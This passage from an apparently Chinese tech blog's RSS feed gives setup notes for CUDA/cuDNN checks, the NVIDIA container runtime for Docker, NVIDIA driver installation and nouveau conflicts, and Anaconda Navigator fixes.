<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>输入代码检测是否安装完成</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvcc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -V</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>安装CUDNN（在WSL２中安装）</h2>
<p>需要注册账号，参考如下地址的3.2</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://blog.csdn.net/iwanvan/article/details/122119595</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后可以安装pytorch，可以直接安装最新版本，只要比驱动version低就行。</p>
]]></content:encoded>
    </item>
    <item>
      <title>为Docker安装NvidiaRuntime</title>
      <link>https://www.geekery.cn/note-book/AI-Training/%E4%B8%BADocker%E5%AE%89%E8%A3%85NvidiaRuntime.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/%E4%B8%BADocker%E5%AE%89%E8%A3%85NvidiaRuntime.html</guid>
      <source url="https://www.geekery.cn/rss.xml">为Docker安装NvidiaRuntime</source>
      <description>为Docker安装NvidiaRuntime 参考链接 https://nvidia.github.io/nvidia-container-runtime/ https://github.com/NVIDIA/nvidia-container-runtime 导入软件库 根据操作系统分类导入 基于Debian的操作系统 For pre-releases...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>参考链接</p>
<ul>
<li>https://nvidia.github.io/nvidia-container-runtime/</li>
<li>https://github.com/NVIDIA/nvidia-container-runtime</li>
</ul>
</blockquote>
<h2>导入软件库</h2>
<h3>根据操作系统分类导入</h3>
<h4>基于Debian的操作系统</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>curl -s -L https://nvidia.github.io/nvidia-container-runtime/gpgkey | \</span></span>
<span class="line"><span>  sudo apt-key add -</span></span>
<span class="line"><span>distribution=$(. /etc/os-release;echo $ID$VERSION_ID)</span></span>
<span class="line"><span>curl -s -L https://nvidia.github.io/nvidia-container-runtime/$distribution/nvidia-container-runtime.list | \</span></span>
<span class="line"><span>  sudo tee /etc/apt/sources.list.d/nvidia-container-runtime.list</span></span>
<span class="line"><span>sudo apt-get update</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>For pre-releases, you need to enable the experimental repos of all dependencies:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo sed -i -e '/experimental/ s/^#//g' /etc/apt/sources.list.d/nvidia-container-runtime.list</span></span>
<span class="line"><span>sudo apt-get update</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>To later disable the experimental repos of all dependencies, you can run:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo sed -i -e '/experimental/ s/^/#/g' /etc/apt/sources.list.d/nvidia-container-runtime.list</span></span>
<span class="line"><span>sudo apt-get update</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h4>基于RHEL的操作系统</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>distribution=$(. /etc/os-release;echo $ID$VERSION_ID)</span></span>
<span class="line"><span>curl -s -L https://nvidia.github.io/nvidia-container-runtime/$distribution/nvidia-container-runtime.repo | \</span></span>
<span class="line"><span>  sudo tee /etc/yum.repos.d/nvidia-container-runtime.repo</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>For pre-releases, you need to enable the experimental repos of all dependencies:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo yum-config-manager --enable libnvidia-container-experimental</span></span>
<span class="line"><span>sudo yum-config-manager --enable nvidia-container-experimental</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>To later disable the experimental repos of all dependencies, you can run:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo yum-config-manager --disable libnvidia-container-experimental</span></span>
<span class="line"><span>sudo yum-config-manager --disable nvidia-container-runtime-experimental</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>更新仓库的验证key</h3>
<p>In order to update the nvidia-container-runtime repository key for your distribution, follow the instructions below.</p>
<h4>基于RHEL的操作系统</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>DIST=$(sed -n 's/releasever=//p' /etc/yum.conf)</span></span>
<span class="line"><span>DIST=${DIST:-$(. /etc/os-release; echo $VERSION_ID)}</span></span>
<span class="line"><span>sudo rpm -e gpg-pubkey-f796ecb0</span></span>
<span class="line"><span>sudo gpg --homedir /var/lib/yum/repos/$(uname -m)/$DIST/nvidia-container-runtime/gpgdir --delete-key f796ecb0</span></span>
<span class="line"><span>sudo yum makecache</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>基于Debian的操作系统</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>curl -s -L https://nvidia.github.io/nvidia-container-runtime/gpgkey | \</span></span>
<span class="line"><span>  sudo apt-key add -</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装Nvidia Runtime</h2>
<h3>安装</h3>
<h4>基于Debian的操作系统</h4>
<ol>
<li>Install the repository for your distribution by following the instructions <a href="http://nvidia.github.io/nvidia-container-runtime/" target="_blank" rel="noopener noreferrer">here</a>.</li>
<li>Install the <code>nvidia-container-runtime</code> package:</li>
</ol>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo apt-get install nvidia-container-runtime</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>基于RHEL的操作系统</h4>
<ol>
<li>Install the repository for your distribution by following the instructions <a href="http://nvidia.github.io/nvidia-container-runtime/" target="_blank" rel="noopener noreferrer">here</a>.</li>
<li>Install the <code>nvidia-container-runtime</code> package:</li>
</ol>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo yum install nvidia-container-runtime</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置Docker引擎</h3>
<h4>方法一</h4>
<blockquote>
<p>直接将Runtime增加进Docker</p>
</blockquote>
<h5>Systemd drop-in file</h5>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo mkdir -p /etc/systemd/system/docker.service.d</span></span>
<span class="line"><span>sudo tee /etc/systemd/system/docker.service.d/override.conf &lt;&lt;EOF</span></span>
<span class="line"><span>[Service]</span></span>
<span class="line"><span>ExecStart=</span></span>
<span class="line"><span>ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime</span></span>
<span class="line"><span>EOF</span></span>
<span class="line"><span>sudo systemctl daemon-reload</span></span>
<span class="line"><span>sudo systemctl restart docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5>Daemon configuration file</h5>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo tee /etc/docker/daemon.json &lt;&lt;EOF</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>    "runtimes": {</span></span>
<span class="line"><span>        "nvidia": {</span></span>
<span class="line"><span>            "path": "/usr/bin/nvidia-container-runtime",</span></span>
<span class="line"><span>            "runtimeArgs": []</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>EOF</span></span>
<span class="line"><span>sudo pkill -SIGHUP dockerd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>You can optionally reconfigure the default runtime by adding the following to <code>/etc/docker/daemon.json</code>:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>"default-runtime": "nvidia"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h5>Command line</h5>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>sudo dockerd --add-runtime=nvidia=/usr/bin/nvidia-container-runtime [...]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>方法二</h4>
<blockquote>
<p>在docker 运行时增加nvidia设备</p>
</blockquote>
<p>example</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8000:8000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jupyterhub</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  --restart=always</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gpus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> muaimingjun/jupyterhub:1.0.0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>重启Dockerd进程</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>安装Nvidia驱动</title>
      <link>https://www.geekery.cn/note-book/AI-Training/%E5%AE%89%E8%A3%85Nvidia%E9%A9%B1%E5%8A%A8.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/%E5%AE%89%E8%A3%85Nvidia%E9%A9%B1%E5%8A%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">安装Nvidia驱动</source>
      <description>安装Nvidia驱动 安装驱动依赖 安装驱动 检查是否安装成功</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>安装驱动依赖</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gcc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g++</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> make</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 删除原有开源驱动包</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> remove</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --purge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nvidia</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装驱动</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nvidia-driver-470</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # 其中470 为版本号</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 重启来激活启动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>检查是否安装成功</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wwh@wwh-desktop:~$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nvidia-smi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Sun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Dec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 15:18:47</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2022</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>英伟达开源驱动和闭源驱动冲突问题</title>
      <link>https://www.geekery.cn/note-book/AI-Training/%E8%8B%B1%E4%BC%9F%E8%BE%BE%E5%BC%80%E6%BA%90%E9%A9%B1%E5%8A%A8%E5%92%8C%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/%E8%8B%B1%E4%BC%9F%E8%BE%BE%E5%BC%80%E6%BA%90%E9%A9%B1%E5%8A%A8%E5%92%8C%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98.html</guid>
      <source url="https://www.geekery.cn/rss.xml">英伟达开源驱动和闭源驱动冲突问题</source>
      <description>英伟达开源驱动和闭源驱动冲突问题 起因 今天朋友安装驱动遇到了一些问题，给了一张日志图片问我怎么办，我看着显示报错最后一行显示 PCI-E xxx.xxxx.xxx nouveau。就是nvidia显卡驱动的问题八九不离十了。 nvidia给了不同类型的驱动多种版本，开源驱动对Linux支持较差，在切换闭源官方驱动的时候经常出现各种问题。 image-...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>起因</h2>
<p>今天朋友安装驱动遇到了一些问题，给了一张日志图片问我怎么办，我看着显示报错最后一行显示 PCI-E xxx.xxxx.xxx
nouveau。就是nvidia显卡驱动的问题八九不离十了。</p>
<p>nvidia给了不同类型的驱动多种版本，开源驱动对Linux支持较差，在切换闭源官方驱动的时候经常出现各种问题。</p>
<p></p>
<p>下面是安装步骤的总结</p>
<h2>正常安装步骤</h2>
<h3>检查开源驱动的存在情况</h3>
<p>运行如下指令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lsmod</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nouveau</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果有内容输出，则说明nouveau已被启用，需要执行下一个步骤以将nouveau禁用；</p>
<p>如果没有内容输出，则可以直接安装nvidia驱动。</p>
<h3>开源驱动加入黑名单</h3>
<p>blacklist.conf文件的位置：/etc/modprobe.d/blacklist.conf</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/modprobe.d/blacklist.conf</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在该文件最后插入以下两行内容：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">blacklist</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nouveau</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">options</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nouveau</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>更新验证生效</h3>
<p>通过如下命令更新系统，使刚刚修改的文件生效：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">update-initramfs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>安装闭源驱动</h3>
<p>首先通过如下命令获取该.run文件的执行权限。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NVIDIA-Linux-x86_64-535.54.03.run</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>通过如下命令运行下载好的.run文件：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./NVIDIA-Linux-x86_64-535.54.03.run</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>重启</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>报错处理</h2>
<h3>无法安装</h3>
<blockquote>
<p>you appear to be running an x server; please exit x before installing.`</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./NVIDIAxxxx.run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-x-check</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>无法开机</h3>
<h4>引导界面更改mode</h4>
<p>进入grub界面，将这个界面的最后部分的“quiet splash —”改为“nomodeset”。F10保存，就可以进入安装界面，进行安装。</p>
<h4>按照正常安装步骤进行安装</h4>
]]></content:encoded>
    </item>
    <item>
      <title>Anaconda-Navigator打不开的解决方法</title>
      <link>https://www.geekery.cn/note-book/Anaconda/Anaconda-Navigator%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Anaconda/Anaconda-Navigator%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Anaconda-Navigator打不开的解决方法</source>
      <description>Anaconda-Navigator打不开的解决方法 解决方案 使用管理员权限运行 Anaconda Prompt 升级 navigator，执行 conda update anaconda-navigator 重置 navigator，执行 anaconda-navigator --reset 升级客户端，执行conda update anacond...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>解决方案</h2>
<ul>
<li>使用管理员权限运行 Anaconda Prompt</li>
<li>升级 <code>navigator</code>，执行 <code>conda update anaconda-navigator</code></li>
<li>重置 <code>navigator</code>，执行 <code>anaconda-navigator --reset</code></li>
<li>升级客户端，执行conda update anaconda-client</li>
<li>升级安装依赖包，执行conda update -f anaconda-client</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>一键安装Conda</title>
      <link>https://www.geekery.cn/note-book/Anaconda/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85Conda.html</link>
      <guid>https://www.geekery.cn/note-book/Anaconda/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85Conda.html</guid>
      <source url="https://www.geekery.cn/rss.xml">一键安装Conda</source>
      <description>一键安装Conda Anacond安装包太大了，不方便下载和安装，每次安装conda工具都很麻烦，于是我写了个脚本。 这个脚本实现了一键安装miniconda，跟conda功能一样，安装包体积减小了很多。 一键安装脚本</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>Anacond安装包太大了，不方便下载和安装，每次安装conda工具都很麻烦，于是我写了个脚本。
这个脚本实现了一键安装miniconda，跟conda功能一样，安装包体积减小了很多。</p>
<h2>一键安装脚本</h2>
